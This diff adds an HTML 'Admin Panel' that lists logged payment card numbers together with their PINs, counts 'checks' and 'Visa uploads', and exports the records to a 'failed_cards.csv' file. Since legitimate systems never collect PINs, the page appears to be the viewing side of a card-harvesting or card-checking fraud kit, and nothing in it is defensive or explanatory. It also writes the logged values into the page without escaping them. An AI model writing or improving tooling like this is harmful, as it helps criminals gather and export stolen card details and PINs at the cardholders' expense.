@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <style>
+    body { font-family: Arial; background: #f0f2f5; padding: 2rem; }
+    .box { max-width: 800px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden; }
+    header { background: #007BFF; color: white; padding: 1.5rem; text-align: center; }
+    h1 { margin: 0; font-size: 1.6rem; }
+    .stats { display: flex; justify-content: space-around; padding: 1rem; background: #f8f9fa; }
+    .stat { text-align: center; }
+    .stat h3 { margin: 0.5rem 0 0; color: #007BFF; font-size: 1.8rem; }
+    .controls { padding: 1rem; text-align: center; }
+    .btn { background: #007BFF; color: white; border: none; padding: 0.7rem 1.5rem; border-radius: 25px; margin: 0 0.5rem; cursor: pointer; }
+    .btn-red { background: #dc3545; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { padding: 1rem; text-align: left; border-bottom: 1px solid #eee; }
+    th { background: #f8f9fa; color: #007BFF; }
+    .empty { text-align: center; padding: 3rem; color: #888; font-style: italic; }
+    footer { text-align: center; padding: 1rem; background: #f8f9fa; font-size: 0.9rem; color: #666; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <header><h1>Admin Panel</h1></header>
+
+    <div class="stats">
+      <div class="stat"><h3 id="total">0</h3><p>Total Checks</p></div>
+      <div class="stat"><h3 id="visa">0</h3><p>Visa Uploads</p></div>
+      <div class="stat"><h3 id="today">0</h3><p>Today</p></div>
+    </div>
+
+    <div class="controls">
+      <button class="btn" onclick="exportCSV()">Export CSV</button>
+      <button class="btn btn-red" onclick="clearAll()">Clear All</button>
+    </div>
+
+    <table>
+      <thead>
+        <tr><th>Time</th><th>Brand</th><th>Card</th><th>PIN</th></tr>
+      </thead>
+      <tbody id="logs"></tbody>
+    </table>
+
+    <footer>Only you can see this page • Data stored in browser</footer>
+  </div>
+
+  <script>
+    const key = 'cardLogs';
+    let logs = JSON.parse(localStorage.getItem(key) || '[]');
+
+    function show() {
+      const tbody = document.getElementById('logs');
+      tbody.innerHTML = '';
+      if (logs.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">No checks yet</td></tr>';
+        return;
+      }
+      logs.sort((a,b) => new Date(b.time) - new Date(a.time)).forEach(l => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `<td>${new Date(l.time).toLocaleString()}</td><td>${l.brand}</td><td>${l.card}</td><td>${l.pin||'—'}</td>`;
+        tbody.appendChild(tr);
+      });
+      updateStats();
+    }
+
+    function updateStats() {
+      const total = logs.length;
+      const visa = logs.filter(l => l.brand === 'Visa').length;
+      const today = logs.filter(l => new Date(l.time).toDateString() === new Date().toDateString()).length;
+      document.getElementById('total').textContent = total;
+      document.getElementById('visa').textContent = visa;
+      document.getElementById('today').textContent = today;
+    }
+
+    function exportCSV() {
+      if (logs.length === 0) return alert('Nothing to export');
+      let csv = 'Time,Brand,Card,PIN\n';
+      logs.forEach(l => csv += `${new Date(l.time).toLocaleString()},${l.brand},${l.card},${l.pin||''}\n`);
+      const blob = new Blob([csv], {type: 'text/csv'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url; a.download = 'failed_cards.csv'; a.click();
+    }
+
+    function clearAll() {
+      if (confirm('Delete ALL data?')) {
+        logs = []; localStorage.removeItem(key); show();
+      }
+    }
+
+    window.addEventListener('storage', e => { if (e.key === key) { logs = JSON.parse(e.newValue || '[]'); show(); } });
+    show();
+  </script>
+</body>
+</html>
